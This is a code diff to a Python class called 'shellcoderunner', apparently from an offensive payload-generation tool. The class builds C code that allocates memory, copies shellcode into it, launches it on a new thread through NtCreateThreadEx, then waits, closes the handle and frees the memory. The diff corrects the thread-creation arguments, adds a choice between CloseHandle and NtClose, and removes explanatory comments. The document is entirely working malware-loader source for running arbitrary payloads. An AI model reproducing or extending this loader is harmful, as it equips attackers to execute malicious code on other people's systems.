@@ -59,7 +59,7 @@ class shellcoderunner:
         elif self.execution == 'NtCreateThreadEx':
             self.executionCode = """
     HANDLE hThread;
-    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
+    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (PVOID)buffer, NULL, 0, (SIZE_T)0, (SIZE_T)0, (SIZE_T)0, NULL);
 """
             self.apicallsList += ['NtCreateThreadEx']
 
@@ -122,6 +122,24 @@ class shellcoderunner:
 """
             self.apicallsList += ['NtWaitForSingleObject']
 
+        self.close = 'CloseHandle'
+        if 'close' in arguments:
+            if arguments['close'] in ['CloseHandle', 'NtClose']:
+                self.close = arguments['close']
+            else:
+                print('Close argument must be CloseHandle, or NtClose')
+                exit(0)
+        if self.close == 'CloseHandle':
+            self.closeCode = """
+    {CloseHandle}(hThread);
+"""
+            self.apicallsList += ['CloseHandle']
+        elif self.close == 'NtClose':
+            self.closeCode = """
+    {NtClose}(hThread);
+"""
+            self.apicallsList += ['NtClose']
+
 
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
@@ -141,21 +159,12 @@ class shellcoderunner:
     def template(self) -> str:
         return Template("""
     {transformers}
-    // Allocate a region of RWX memory for shellcode
+
     $allocation
-
-    // Copy our shellcode into memory that we just allocated (inside of our current process)
     $copy
-
     $protect
-    
-    // Create thread to run shellcode
     $execution
-
-    // Wait for thread to finish
     $wait
-    {CloseHandle}(hThread);
-
-    // Clean up by freeing the memory we allocated for our shellcode
+    $close
     $free
-""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, protect=self.protectCode, copy=self.copyCode, wait=self.waitCode)
+""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, protect=self.protectCode, copy=self.copyCode, wait=self.waitCode, close=self.closeCode)
